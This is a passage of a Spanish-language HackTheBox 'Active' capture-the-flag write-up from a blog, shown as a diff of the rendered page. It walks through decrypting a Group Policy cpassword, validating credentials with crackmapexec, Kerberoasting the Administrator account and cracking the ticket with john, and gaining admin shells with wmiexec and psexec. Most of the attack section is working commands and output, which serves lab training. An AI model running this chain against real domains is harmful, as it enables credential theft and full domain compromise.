+</blockquote>
+
+<p>También nos indica que cuando se genera un <strong>GPP</strong> (<a href="https://searchwindowsserver.techtarget.com/definition/Group-Policy-Preferences">Group Policy Preference</a>) se asocia un archivo <strong>XML</strong> con información relevante (muy relevante):</p>
+
+<blockquote>
+  <p>When a new GPP is created, there’s an associated XML file created in SYSVOL with the relevant configuration data and if there is a password provided, it is AES-256 bit encrypted which should be good enough…</p>
+</blockquote>
+
+<p>Peroooooooo:</p>
+
+<blockquote>
+  <p>Except at some point prior to 2012, Microsoft published the AES encryption key (shared secret) on MSDN which can be used to decrypt the password.</p>
+</blockquote>
+
+<p>Bingo!</p>
+
+<p>Así que de alguna forma podemos desencriptar la contraseña… Buscando herramientas para esto, encontramos <a href="https://github.com/reider-roque/pentest-tools/blob/master/password-cracking/gpprefdecrypt/gpprefdecrypt.py">gpprefdecrypt.py</a>, a la cual simplemente debemos pasarle el contenido encriptado y obtendríamos la contraseña en texto plano:</p>
+
+<pre><code class="language-bash">ゝ wget https://raw.githubusercontent.com/reider-roque/pentest-tools/master/password-cracking/gpprefdecrypt/gpprefdecrypt.py
+ゝ python gpprefdecrypt.py 
+Usage: python gpprefdecrypt.py CPASSWORD
+</code></pre>
+
+<pre><code class="language-bash">ゝ python gpprefdecrypt.py "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
+GPPstillStandingStrong2k18
+</code></pre>
+
+<p>Opaaaaaaaaaa, tenemos una contraseña y al parecer es del usuario <strong>SVC_TGS</strong>, probemos con <strong>crackmapexec</strong> y veamos si son credenciales funcionales:</p>
+
+<pre><code class="language-bash"># Contraseña correcta
+ゝ crackmapexec smb 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18'
+SMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
+SMB         10.10.10.100    445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18 
+# Validando que realmente sea correcta
+ゝ crackmapexec smb 10.10.10.100 -u 'SVC_TGS' -p 'InvaliD4supuestam3nt3'
+SMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
+SMB         10.10.10.100    445    DC               [-] active.htb\SVC_TGS:InvaliD4supuestam3nt3 STATUS_LOGON_FAILURE
+</code></pre>
+
+<p>Y sí, son válidas contra el <strong>DC</strong>…</p>
+
+<p>Probándolas contra el servicio <strong>WinRM</strong> mediante la herramienta <a href="https://github.com/Hackplayers/evil-winrm">evil-winrm</a> no logramos acceso a una PowerShell :( Pero jugando de nuevo con <strong>smbmap</strong> y <strong>smbclient</strong> tenemos acceso a otras carpetas compartidas:</p>
+
+<pre><code class="language-bash">ゝ smbmap -H 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18'
+[+] IP: 10.10.10.100:445        Name: active.htb                                        
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        ADMIN$                                                  NO ACCESS       Remote Admin
+        C$                                                      NO ACCESS       Default share
+        IPC$                                                    NO ACCESS       Remote IPC
+        NETLOGON                                                READ ONLY       Logon server share 
+        Replication                                             READ ONLY
+        SYSVOL                                                  READ ONLY       Logon server share 
+        Users                                                   READ ONLY
+</code></pre>
+
+<p>Entre los 4 directorios a los que tenemos acceso de lectura, uno de ellos se ve interesante, ¿cuál? e.e Pues si, el directorio <strong>Users</strong> ta mirándonos directamente a los ojos y desafiando nuestra habilidad de enumerarlo, así que juguemos con él :P</p>
+
+<pre><code class="language-powershell">ゝ smbclient //10.10.10.100/Users -U 'SVC_TGS'
+Enter WORKGROUP\SVC_TGS's password: 
+Try "help" to get a list of possible commands.
+smb: \&gt; dir
+  .                                  DR        0  Sat Jul 21 09:39:20 2018
+  ..                                 DR        0  Sat Jul 21 09:39:20 2018
+  Administrator                       D        0  Mon Jul 16 05:14:21 2018
+  All Users                       DHSrn        0  Tue Jul 14 00:06:44 2009
+  Default                           DHR        0  Tue Jul 14 01:38:21 2009
+  Default User                    DHSrn        0  Tue Jul 14 00:06:44 2009
+  desktop.ini                       AHS      174  Mon Jul 13 23:57:55 2009
+  Public                             DR        0  Mon Jul 13 23:57:55 2009
+  SVC_TGS                             D        0  Sat Jul 21 10:16:32 2018
+
+                10459647 blocks of size 4096. 5728465 blocks available
+smb: \&gt; 
+</code></pre>
+
+<p>De nuevo tenemos varios directorios, descarguemoslos, ahora hagamos uso del propio <strong>smbclient</strong> para esto:</p>
+
+<pre><code class="language-powershell">smb: \&gt; recurse ON
+smb: \&gt; prompt OFF
+smb: \&gt; mget *
+...
+...
+...
+smb: \&gt;
+</code></pre>
+
+<p>Listos, entre los archivos, en la descarga nos damos cuenta de que tenemos uno llamado <strong>user.txt</strong> (la flag) (?), validemos, porque si tenemos la flag (y es válida) entendemos que la carpeta <strong>Users</strong> está sincronizada en tiempo real:</p>
+
+<pre><code class="language-bash">ゝ cat SVC_TGS/Desktop/user.txt 
+86d6...
+</code></pre>
+
+<p>Ingresándola como flag en <strong>Hack The Box</strong> nos damos cuenta de que es válida, por lo tanto confirmamos lo antes dicho :P</p>
+
+<p>Jmmm, entonces nos queda ver como podemos obtener una terminal ya sea como el usuario <strong>SVC_TGS</strong> o directamente como <strong>Administrator</strong>, demos algunas vueltas para descubrir que hacer…</p>
+
+<p>…</p>
+
+<h2 id="escalada-de-privilegios">Escalada de privilegios <a href="#escalada-de-privilegios">#</a></h2>
+
+<p>Podemos ver los usuarios del dominio con <a href="https://www.sans.org/blog/plundering-windows-account-info-via-authenticated-smb-sessions/">rpcclient</a> apoyándonos de las nuevas credenciales, pero también con una herramienta del conjunto <a href="https://github.com/SecureAuthCorp/impacket/tree/master/examples">impacket</a> llamada <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetADUsers.py">GetADUsers.py</a> que nos muestra esa información:</p>
+
+<pre><code class="language-bash">ゝ GetADUsers.py -all active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100
+Impacket v0.9.22.dev1+20200909.150738.15f3df26 - Copyright 2020 SecureAuth Corporation
+
+[*] Querying 10.10.10.100 for information about domain.
+Name                  Email                           PasswordLastSet      LastLogon           
+--------------------  ------------------------------  -------------------  -------------------
+Administrator                                         2018-07-18 14:06:40.351723  2021-01-21 11:07:03.723783 
+Guest                                                 &lt;never&gt;              &lt;never&gt;             
+krbtgt                                                2018-07-18 13:50:36.972031  &lt;never&gt;             
+SVC_TGS                                               2018-07-18 15:14:38.402764  2021-05-12 23:47:48.356719
+</code></pre>
+
+<p>Hay 4 usuarios, pero activos constantemente solo 2, <strong>Administrator</strong> y <strong>SVC_TGS</strong>.</p>
+
+<p>…</p>
+
+<p>Despues de intentar interactuar con las carpetas compartidas a ver si podíamos subir algo (no se pudo :P) y jugar con los demás puertos a ver si alguno tenía algo interesante, caemos en el servicio <strong>Kerberos</strong>.</p>
+
+<p>…</p>
+
+<h3 id="puerto-88">Puerto 88 - Kerberos <a href="#puerto-88">⌖</a></h3>
+
+<blockquote>
+  <p><strong>Kerberos</strong> es un sistema de autenticación mutua, es decir, el cliente verifica y comprueba la identidad del servidor, mientras que el servidor acredita y verifica la identidad del cliente. <a href="https://hardsoftsecurity.es/index.php/2019/05/18/poc-pentesting-en-active-directory/">Pentensting AD</a>.</p>
+</blockquote>
+
+<ul>
+  <li><a href="https://www.tarlogic.com/en/blog/how-kerberos-works/">How does <strong>Kerberos</strong> works</a>.</li>
+</ul>
+
+<p>Existen varios tipos de ataques que pueden ser llevados a cabo (o probados) ante un servidor <strong>kerberos</strong>, uno de ellos llamado <strong>Kerberoasting</strong>:</p>
+
+<blockquote>
+  <p>Hay un tipo de cuentas que son específicas para la ejecución de un servicio. Generalmente, este tipo de cuentas disfrutan de privilegios excesivos y muchas veces también pertenecen al grupo de “Administradores de Dominio” en los controladores de dominio. <a href="https://seguridad-ofensiva.com/blog/directorio-activo/kerberoasting/">Kerberoasting</a>.</p>
+</blockquote>
+
+<p>Por lo tanto hay cuentas “normales” que realmente están siendo usadas para ejecutar tareas privilegiadas y por el fondo hablarían como tal, cuentas privilegiadas :o</p>
+
+<blockquote>
+  <p>El objetivo del <strong>Kerberoasting</strong> es recolectar tickets <strong>TGS</strong> (<strong>Ticket Granting Service</strong>: ticket que se presenta ante un servicio para poder acceder a sus recursos) para servicios que se ejecutan en nombre de cuentas de usuario del AD, no cuentas del sistema. <a href="https://www.tarlogic.com/en/blog/how-to-attack-kerberos/">Attacking <strong>kerberos</strong> - Kerberoasting</a>.</p>
+</blockquote>
+
+<p>Estos tickets pueden ser crackeados, pero claro, depende siempre de lo fuerte que sea la contraseña…</p>
+
+<blockquote>
+  <p>Pa leer: <a href="https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html">How to attack <strong>Kerberos</strong></a>.</p>
+</blockquote>
+
+<p>Podemos <a href="https://room362.com/post/2016/kerberoast-pt2/#impacket">apoyarnos de una herramienta</a> de <strong>impacket</strong> llamada <code>GetUserSPNs.py</code> que valida el trasfondo de una cuenta y extrae los tickets correspondientes:</p>
+
+<ul>
+  <li>Le pasamos el dominio/usuario:contraseña.</li>
+  <li>La dirección IP del DC.</li>
+  <li>Y con el parámetro <code>-requests</code> le decimos que haga una petición para que devuelta nos muestre los tickets.</li>
+</ul>
+
+<p>A vel:</p>
+
+<pre><code class="language-bash">ゝ GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request
+Impacket v0.9.22.dev1+20200909.150738.15f3df26 - Copyright 2020 SecureAuth Corporation
+
+ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation
+--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
+active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 14:06:40.351723  2021-01-21 11:07:03.723783
+
+
+[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
+</code></pre>
+
+<p>Inicialmente vemos que el usuario <strong>SVC_TGS</strong> es administrador aparentemente del servicio <strong>SMB</strong> (Puerto 445), perfecto, por un lado tamos felices, pero por el otro vemos un error :(</p>
+
+<pre><code class="language-bash">[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
+</code></pre>
+
+<p>Con lo que debe ser un error de sincronización o algo por el estilo… Buscando el error en internet encontramos <a href="https://askubuntu.com/questions/1010967/kerberos-authentication-clock-skew-too-great">esta respuesta en el foro <strong>askubuntu</strong></a>:</p>
+
+<blockquote>
+  <pre><code class="language-bash">sudo apt install ntpdate
+ntpdate domaincontroller.yourdomain.com
+</code></pre>
+</blockquote>
+
+<blockquote>
+  <p>Pa leer: <a href="https://book.hacktricks.xyz/windows/active-directory-methodology/kerberoast">Acá tambien encontramos la solución al error</a>.</p>
+</blockquote>
+
+<p>Leyendo entendemos que el problema es que nosotros como clientes no estamos sincronizados con el servidor <strong>kerberos</strong>, por eso tamos K.O, pero apoyándonos de <strong>ntpdate</strong> podemos indicarle que nos haga ese favor, probemos:</p>
+
+<pre><code class="language-bash">ゝ ntpdate 10.10.10.100
+13 May 23:24:25 ntpdate[267388]: adjust time server 10.10.10.100 offset +0.048002 sec
+</code></pre>
+
+<p>Y volvemos a validar:</p>
+
+<pre><code class="language-bash">ゝ GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request
+Impacket v0.9.22.dev1+20200909.150738.15f3df26 - Copyright 2020 SecureAuth Corporation
+
+ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
+--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
+active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 14:06:40.351723  2021-01-21 11:07:03.723783             
+
+
+$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$1e8922f5b27692b73e8d64c82e667ee3$cabea62f8331d74174f9a337ca68e1561f1e7060fe661c4e094c31a95e56993ddba0968faeb292a6f8ad99e4844fd30a323b9a9adb9888d61bb7b4e665c3dfa3c345ba2259eae481a1e569b3982711a6ceace7b0ef20f18288fad8f43595f2ca56edcc9eb86979a3f33890d7e9f8d6caeb9267fa410171378f59b316cc0ddd89079ae1e3e48c171630a4f45b7b7c0b449f1f3c6878ca31d94c664bb8f47f9706eb0e316cabdd86aaf0568d7f8ec8de5fc6cc1760c5372412812528f304b3a3345c5a122d3e5e5f817b307c8ffe0b54d75ef2fb0e7b46882632e427bd4a699887c982171465238d05f76b19efb8b2616f7c80e3907cfee77d673e11c1161c0c142e79479a034a0d1b7aeb164fa945363f9d3825ac4da71bda2527efd321f2773d613d13dd0e20bbc88ad49bc64c7572c40546bdbc55350cf3fec0ffb6ff9633e5eed99395b454b15fd1f329313ef4e21f13372e48d395dbeef7b4888f136232d17915c0ed0175a1bd97f5715a2473408bdf53170b59d0744ab8c3554b93595a2cd8726b69f31ca8a75f501f70a810d83e70dace0e8f6409fa4b8579000d352b0a55ebecc528b232367980a753c5a0e7dd4cfed288aa2da2c16332899fe4ee866c5d62ce28a2285d1e5f6fb98964ee2e105ddbeae3c0d5c0b50531ae42d61572995d971c2198ab38897e9d69defd62935f7eda31eea7f87ad921a8f67c4aac069c06ab7b39f947260db380bb9e02a644fba7c8d8e2abd60380d742ac3f6578e40256fc880017ac9b1309716ea4000872abc9f84ce5ec615d4366fff5800b3b3d921652ff9e4ecd3de2bf13438e89604af38ac9a796cc7c728ac7527c77dfdc414ceb7ffa06912fd7cc85d83ba82fdd988ff2defde5b029731c28c431daf60a176b9d618c55b957c5414b5ff03c287fc4595cc7171a13f894010888da18b315cb9c8a1c3b7c50ab32129239cf8c08312cc5e0a4d82f9a2caf9146d17da9128d213bae4212b4814f28a5052c892a52c30d5b890312a552a87c2870b768217fc5b547883c36b2e80d2c5fd6be140ee54f0b9c092eb739df0f3c9a445aa78d0073e9f95c31b2b9990b219db46b7f4050184798e28ec4e2583ff7ae1deb83b5ee62b903d792137a8909e3f84b64abb9288abfc7e4a999fbb419bd765c85c550e14dfc8bf8462aee29504c4a2ac78aa353c580b1c1463b2e1ba214fb70b3ef351448bcd3acfb4a1fd115ca4726fd767ed13a13b0a7a284101b541744402f
+</code></pre>
+
+<p>Perfecto, ahora si se genera el ticket, intentemos crackearlo. Tomamos todo el Ticket, lo pegamos en un archivo (o con el propio <strong>GetUserSPNs.py</strong> pasándole el argumento <code>-outputfile &lt;file_name&gt;</code>) y haciendo uso de <strong>john</strong> podemos indicarle:</p>
+
+<pre><code class="language-bash">ゝ john --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5tgs hash.SPN 
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Ticketmaster1968 (?)
+1g 0:00:00:24 DONE (2021-05-13 23:24) 0.04091g/s 431148p/s 431148c/s 431148C/s Tickle7..Tibor
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+</code></pre>
+
+<p>Obtenemos como contraseña en texto plano: <strong><em>Ticketmaster1968</em></strong>. Por lo cual, podríamos probarla contra el usuario <strong>Administrator</strong> del sistema a ver si conseguimos algo :P</p>
+
+<p>Validamos que las credenciales sean funcionales y sobre todo que sean poderosas:</p>
+
+<pre><code class="language-bash">ゝ crackmapexec smb 10.10.10.100 -u 'Administrator' -p 'Ticketmaster1968'
+SMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
+SMB         10.10.10.100    445    DC               [+] active.htb\Administrator:Ticketmaster1968 (Pwn3d!)
+</code></pre>
+
+<p>Lindo, vemos que son válidas, pero sobre todo vemos algo que dice “<strong>Pwn3d</strong>”, esto nos indica que somos los duros del sistema con estas credenciales, o sea, podemos hacer de todo ;)</p>
+
+<p>…</p>
+
+<h4 id="obtención-terminal-con-el-usuario-administrator">Obtención terminal con el usuario Administrator</h4>
+
+<p>Usaremos dos herramientas:</p>
+
+<h5 id="-wmiexec">¬ wmiexec</h5>
+
+<p>Podemos apoyarnos de la herramienta <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py">wmiexec</a> (del conjunto <strong>impacket</strong>) para entablarnos una terminal en una máquina, ya sea con credenciales o en caso de contar con hashes también podríamos:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/active/148bash_wmiexec_admin_done.png" alt="148bash_wmiexec_admin_done" /></p>
+
+<p>LISTONEEEEEEEEEEEES, ya podríamos interactuar a full con el DC.</p>
+
+<h5 id="-psexec">¬ psexec</h5>
+
+<p>Podemos aprovechar la ocasión para probar la herramienta <a href="https://www.luaces-novo.es/winexe-el-psexec-para-linux/">psexec</a> que también nos permite ejecutar comandos, usémosla para obtener una terminal:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/active/148bash_psexec_admin_done.png" alt="148bash_psexec_admin_done" /></p>
+
+<p>Y también obtenemos una cmd :)</p>
+
+<p>Solo nos quedaría ver las flags:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/active/148flags.png" alt="148flags" /></p>
+
+<p>…</p>
+
+<p>Esto es todo por esta máquina, muy entretenida, mi primer recorrido por un <strong>DC</strong>, había hecho la máquina <strong>Sauna</strong>, pero no la documente y muuuuy pocas cosas me acordaba de ella, así que esta me sirvió como nuevo punto de partida para estas máquinas que se pueden volver muy locas y difíciles, pero a la vez divertidas (:</p>
+
+<p>Y nada, a seguir rompiendo todo! Nos leeremos luego &lt;3</p>
+
+</div>
+
+<!-- Rating -->
+
+
+<!-- Author Box if enabled from _config.yml -->
+<!-- Author Box -->
+
+
+
+
+<!-- Comments if not disabled with comments: false -->
+<!-- Comments
+================================================== -->
+ 
+<div class="comments">
+    <button class="btn btn-dark show-comments">Comentarios</button>         
+    <div id="comments">  
+        <h4 class="mb-4">Comments</h4>                 
+            <section class="disqus">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = 'demowebsite'; 
+        var disqus_developer = 0;
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+     
+    <div class="clearfix"></div>              
+    </div>    
+</div>       
+
+
+<!-- Share -->
+<div class="share">
+    <p>
+        Vacios
+    </p>
+    <ul>
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://twitter.com/intent/tweet?text=HackTheBox - Active&url=http://localhost:4000/htb/active" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                <i class="fab fa-twitter"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://www.hackthebox.eu/profile/73707" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fas fa-cube"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://github.com/lanzt" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fab fa-github"></i>
+            </a>
+        </li>
+
+    </ul>
+</div>
+
+
+<!-- Related Post -->
+<!-- Related Posts
+================================================== -->
+<div class=" related-posts ">  
+
+    
+    <h2 class="text-center mb-4">Posts relacionados a este (o se hace el intento).</h2>
+    
+    
+    <div class="d-flex justify-content-center align-items-center">
+
+    <!-- Tags -->  
+    
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#DC">DC</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#SMB">SMB</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#cracking">cracking</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#kerberos">kerberos</a>               
+    
+    
+    <!-- Categories -->
+    
+    
+    <a class="smoothscroll badge badge-primary" href="/categories#htb">htb</a>                
+    
+
+    </div>
+
+    
+    
+    
+    <div class="blog-grid-container">
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/resolute">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/resolute/220banner.png" alt="HackTheBox - Resolute"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/resolute">HackTheBox - Resolute</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Windows nivel medio. Enumeraremos hasta más no poder un controlador de dominio, veremos contraseñas volando libremente e inyectaremos una DLL maliciosa en un servidor DNS 😲
+
+</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">14 Aug 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/atom">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/atom/340banner.png" alt="HackTheBox - Atom"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/atom">HackTheBox - Atom</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Windows nivel medio. Jugaremos con SMB, recrearemos actualizaciones (feature de electron) en binarios para que sean ejecutados por un equipo de QA y encontraremos la relación amorosa entre Redis...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">10 Jul 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/tentacle">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tentacle/310banner.png" alt="HackTheBox - Tentacle"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/tentacle">HackTheBox - Tentacle</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Linux nivel difícil (pareció insana eh!). Nos toparemos con varios dominios escondidos, jugaremos con proxychains para encadenarnos, enumeraremos IPs fantasmas y explotaremos una de ellas que esta corriendo OpenSMTPD....</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">19 Jun 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+                
+        </div>        
+</div>
+
+<!-- Review with LD-JSON, adapt it for your needs if you like, but make sure you test the generated HTML source code first: 
+https://search.google.com/structured-data/testing-tool/u/0/
+================================================== -->
+
+    </div>
+
+    
+    <!-- Newsletter
+    ================================================== -->
+    <div class="newsletter text-center">
+        <span class="h4"><img src="/assets/images/sh0x.png" class="newsletter-logo" alt="Sh0x blog"></span>
+        <p></p>
+    </div>
+    
+    
+</div>
+
+<!-- Begin Footer
+================================================== -->
+<footer class="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-6 col-sm-12 text-center text-lg-left">
+                Copyright © 2022 Sh0x blog 
+            </div>
+            <div class="col-md-6 col-sm-12 text-center text-lg-right">    
+                <a target="_blank" href="https://www.wowthemes.net/memoirs-free-jekyll-theme/">Memoirs Jekyll Theme</a> by WowThemes.net
+            </div>
+        </div>
+    </div>
+</footer>
+<!-- End Footer
+================================================== -->
+
+</div> <!-- /.site-content -->
+
+<!-- Scripts (if you need bootstrap.js, please add it yourself. I didn't use it for performance reasons, it was not needed in this theme)
+================================================== -->
+
+<script src="/assets/js/prism.js"></script>
+
+<script src="/assets/js/theme.js"></script>
+
+
+
+
+<script id="dsq-count-scr" src="//demowebsite.disqus.com/count.js"></script>
+
+
+</body>
+</html>
